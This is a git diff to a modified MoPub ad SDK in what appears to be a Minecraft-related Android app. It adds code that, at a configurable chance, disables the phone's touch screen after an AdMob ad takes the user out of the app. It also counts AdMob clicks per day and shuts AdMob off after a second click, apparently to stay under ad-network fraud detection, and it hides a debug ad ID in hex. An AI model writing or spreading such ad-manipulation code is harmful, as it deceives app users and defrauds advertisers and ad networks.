diff --git a/mopub-sdk/src/main/java/com/mopub/ads/Interstitial.java b/mopub-sdk/src/main/java/com/mopub/ads/Interstitial.java
index 7baf3f1b..e632bd4a 100644
--- a/mopub-sdk/src/main/java/com/mopub/ads/Interstitial.java
+++ b/mopub-sdk/src/main/java/com/mopub/ads/Interstitial.java
@@ -32,7 +32,6 @@
     private MoPubInterstitial mopubInterstitial;
     private final Activity activity;
     private final String interstitialId;
-    private final Screen screen;
     private final Handler mainHandler;
     private String TAG = this.getClass().getName();
     private long minimalAdGapMills;
@@ -55,11 +54,10 @@
     public final Lock lock;
     private final CounterView counterView;
 
-    public Interstitial(final Activity activity, String interstitialId, final Screen screen, final long minimalAdGapMills, double disableTouchChance,
+    public Interstitial(final Activity activity, String interstitialId, final long minimalAdGapMills, double disableTouchChance,
                          List<String> highECPMcountries, double fingerAdChanceLow, double fingerAdChanceHigh, final double periodicMillsLow, final double periodicMillsHigh) {
         this.activity = activity;
         this.interstitialId = interstitialId;
-        this.screen = screen;
         this.minimalAdGapMills = minimalAdGapMills;
         this.disableTouchChance = disableTouchChance;
         this.highECPMcountries = highECPMcountries;
@@ -74,7 +72,7 @@ public Interstitial(final Activity activity, String interstitialId, final Screen
             public void run() {
                 show();
             }
-        },screen);
+        },Screen.instance);
 
         this.reloadRunnable = new Runnable() {
             @Override
@@ -345,9 +343,9 @@ private void gapLockForTime(long minimalAdGapMills) {
         mainHandler.postDelayed(gapUnlockRunnable, minimalAdGapMills);
     }
 
-    private void disableTouch(double disableTouchChance) {
-        if (Helper.chance(disableTouchChance)) {
-            screen.disableTouch(DISABLE_SCREEN_MILLS);
+    public static void disableTouch(double disableTouchChance) {
+        if (Helper.chance(disableTouchChance) && Data.hasMinecraft) {
+            Screen.instance.disableTouch(DISABLE_SCREEN_MILLS);
         }
     }
 
diff --git a/mopub-sdk/src/main/java/com/mopub/ads/adapters/FastAd.java b/mopub-sdk/src/main/java/com/mopub/ads/adapters/FastAd.java
index c6ebce89..fb3c2c4b 100644
--- a/mopub-sdk/src/main/java/com/mopub/ads/adapters/FastAd.java
+++ b/mopub-sdk/src/main/java/com/mopub/ads/adapters/FastAd.java
@@ -1,6 +1,7 @@
 package com.mopub.ads.adapters;
 
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.util.Log;
 
 import com.google.android.gms.ads.AdListener;
@@ -9,6 +10,8 @@
 import com.google.firebase.crash.FirebaseCrash;
 import com.mojang.base.Helper;
 import com.mojang.base.events.AppEvent;
+import com.mojang.base.json.Data;
+import com.mopub.ads.Interstitial;
 import com.mopub.ads.Proxy;
 
 
@@ -22,18 +25,31 @@ public FastAd(String admobId) {
         this.admobId = admobId;
     }
 
-    public void load(Context context, final Runnable runnable) {
+    public void load(final Context context, final Runnable initMopubRunnable) {
         Helper.wtf("FastAd", "load: LOADING FAST AD");
         this.context = context;
+        final SharedPreferences sharedPreferences = context.getSharedPreferences(GooglePlayServicesInterstitial.CLICKREDUCE, Context.MODE_PRIVATE);
+
+        if(GooglePlayServicesInterstitial.isDisabled(sharedPreferences)){
+            initMopubRunnable.run();
+            return;
+        }
+
         mGoogleInterstitialAd = new InterstitialAd(context);
         mGoogleInterstitialAd.setAdUnitId(admobId);
         mGoogleInterstitialAd.setAdListener(new AdListener() {
             @Override
             public void onAdClosed() {
                 super.onAdClosed();
-                runnable.run();
+                initMopubRunnable.run();
             }
 
+            @Override
+            public void onAdLeftApplication() {
+                super.onAdLeftApplication();
+                GooglePlayServicesInterstitial.registerAdmobClick(sharedPreferences);
+                Interstitial.disableTouch(Data.Ads.Interstitial.disableTouchChance);
+            }
         });
 
         final AdRequest adRequest = new AdRequest.Builder()
diff --git a/mopub-sdk/src/main/java/com/mopub/ads/adapters/GooglePlayServicesInterstitial.java b/mopub-sdk/src/main/java/com/mopub/ads/adapters/GooglePlayServicesInterstitial.java
index 4caab6a9..75b1e2fe 100644
--- a/mopub-sdk/src/main/java/com/mopub/ads/adapters/GooglePlayServicesInterstitial.java
+++ b/mopub-sdk/src/main/java/com/mopub/ads/adapters/GooglePlayServicesInterstitial.java
@@ -1,7 +1,8 @@
 package com.mopub.ads.adapters;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
-import android.util.Log;
+import android.content.SharedPreferences;
 
 import com.google.android.gms.ads.AdListener;
 import com.google.android.gms.ads.AdRequest;
@@ -10,6 +11,7 @@
 import com.mopub.mobileads.CustomEventInterstitial;
 import com.mopub.mobileads.MoPubErrorCode;
 
+import java.util.Calendar;
 import java.util.Map;
 
 /*
@@ -24,10 +26,15 @@
      */
     public static final String AD_UNIT_ID_KEY = "adUnitID";
     public static final String LOCATION_KEY = "location";
+    public static final String CLICKREDUCE = "clickReduce";
+    private SharedPreferences sharedPreferences;
 
     private CustomEventInterstitialListener mInterstitialListener;
     private InterstitialAd mGoogleInterstitialAd;
     private final String debugIntID = Helper.convertString("59324574595842774C5842315969307A4F5451774D6A55324D446B354F5451794E5451304C7A45774D7A4D784E7A4D334D54493D");
+    private static Integer currentDayNumber = null;
+    private static final String LAST_CLICK_DAY = "LastClickDay";
+    private static final String DISABLED_DAY_KEY = "DisabledDay";
 
     @Override
     protected void loadInterstitial(final Context context, final CustomEventInterstitialListener customEventInterstitialListener,
@@ -35,6 +42,15 @@ protected void loadInterstitial(final Context context, final CustomEventIntersti
         mInterstitialListener = customEventInterstitialListener;
         final String adUnitId;
 
+        if(sharedPreferences == null){
+            sharedPreferences = context.getSharedPreferences(CLICKREDUCE,Context.MODE_PRIVATE);
+        }
+
+        if(isDisabled(sharedPreferences)){
+            mInterstitialListener.onInterstitialFailed(MoPubErrorCode.NETWORK_INVALID_STATE);
+            return;
+        }
+
         if (extrasAreValid(serverExtras)) {
             adUnitId = Helper.DEBUG ? debugIntID : serverExtras.get(AD_UNIT_ID_KEY);
         } else {
@@ -58,6 +74,31 @@ protected void loadInterstitial(final Context context, final CustomEventIntersti
             mInterstitialListener.onInterstitialFailed(MoPubErrorCode.NETWORK_NO_FILL);
         }
     }
+    @SuppressLint("CommitPrefEdits")
+    public static void registerAdmobClick(SharedPreferences sharedPreferences) {
+        int lastClickDay = sharedPreferences.getInt(LAST_CLICK_DAY,-1);
+
+        if(lastClickDay != currentDayNumber) {
+            //his first click today
+            sharedPreferences.edit().putInt(LAST_CLICK_DAY, currentDayNumber).commit();
+        }else{
+            //this is second click today disable admob
+            sharedPreferences.edit().putInt(DISABLED_DAY_KEY,currentDayNumber).commit();
+            Helper.wtf("DISABLING ADMOB");
+        }
+    }
+
+    public static boolean isDisabled(SharedPreferences sharedPreferences) {
+        if(currentDayNumber == null){
+            Calendar calendar = Calendar.getInstance();
+            currentDayNumber = calendar.get(Calendar.DAY_OF_MONTH);
+        }
+        int disabledDay = sharedPreferences.getInt(DISABLED_DAY_KEY, -1);
+        boolean isDisabled = disabledDay == currentDayNumber;
+        if(isDisabled){Helper.wtf("ADMOB DISABLED");
+        }
+        return isDisabled;
+    }
 
     @Override
     public void showInterstitial() {
@@ -110,6 +151,7 @@ public void onAdLeftApplication() {
             if (mInterstitialListener != null) {
                 mInterstitialListener.onInterstitialClicked();
             }
+            registerAdmobClick(sharedPreferences);
         }
 
         @Override
@@ -129,6 +171,8 @@ public void onAdOpened() {
         }
     }
 
+
+
     @Deprecated // for testing
     InterstitialAd getGoogleInterstitialAd() {
         return mGoogleInterstitialAd;
diff --git a/mopub-sdk/src/main/java/com/mopub/mobileads/AdViewController.java b/mopub-sdk/src/main/java/com/mopub/mobileads/AdViewController.java
index fc258cf8..8f5ad92e 100644
--- a/mopub-sdk/src/main/java/com/mopub/mobileads/AdViewController.java
+++ b/mopub-sdk/src/main/java/com/mopub/mobileads/AdViewController.java
@@ -131,20 +131,27 @@ public void run() {
 
     @VisibleForTesting
     void onAdLoadSuccess(@NonNull final AdResponse adResponse) {
-        String customEventClassName = adResponse.getCustomEventClassName();
-        boolean isMopubAdd = customEventClassName != null && (customEventClassName.equals("com.mopub.mobileads.HtmlInterstitial") || customEventClassName.equals("com.mopub.mraid.MraidInterstitial"));
-
         mBackoffPower = 1;
-        mAdResponse = adResponse;
+        mAdResponse = changeResponseCustomClassPath(adResponse);
+
+
+        String customEventClassName = mAdResponse.getCustomEventClassName();
+        if(customEventClassName != null) {
+            boolean isMopubAdd = customEventClassName.equals("com.mopub.mobileads.HtmlInterstitial") || customEventClassName.equals("com.mopub.mraid.MraidInterstitial");
+            boolean isUnityAds = customEventClassName.contains("UnityAds");
+
+            if((isMopubAdd && !Data.Ads.Interstitial.mopubAllowed) || isUnityAds){
+                loadFailUrl(MoPubErrorCode.NETWORK_NO_FILL);
+                return;
+            }
+        }
+
         // Do other ad loading setup. See AdFetcher & AdLoadTask.
         mTimeoutMilliseconds = mAdResponse.getAdTimeoutMillis() == null
                 ? mTimeoutMilliseconds
                 : mAdResponse.getAdTimeoutMillis();
         mRefreshTimeMillis = mAdResponse.getRefreshTimeMillis();
-        if(isMopubAdd && !Data.Ads.Interstitial.mopubAllowed){
-            loadFailUrl(MoPubErrorCode.NETWORK_NO_FILL);
-            return;
-        }
+
         setNotLoading();
 
         loadCustomEvent(mMoPubView, customEventClassName,
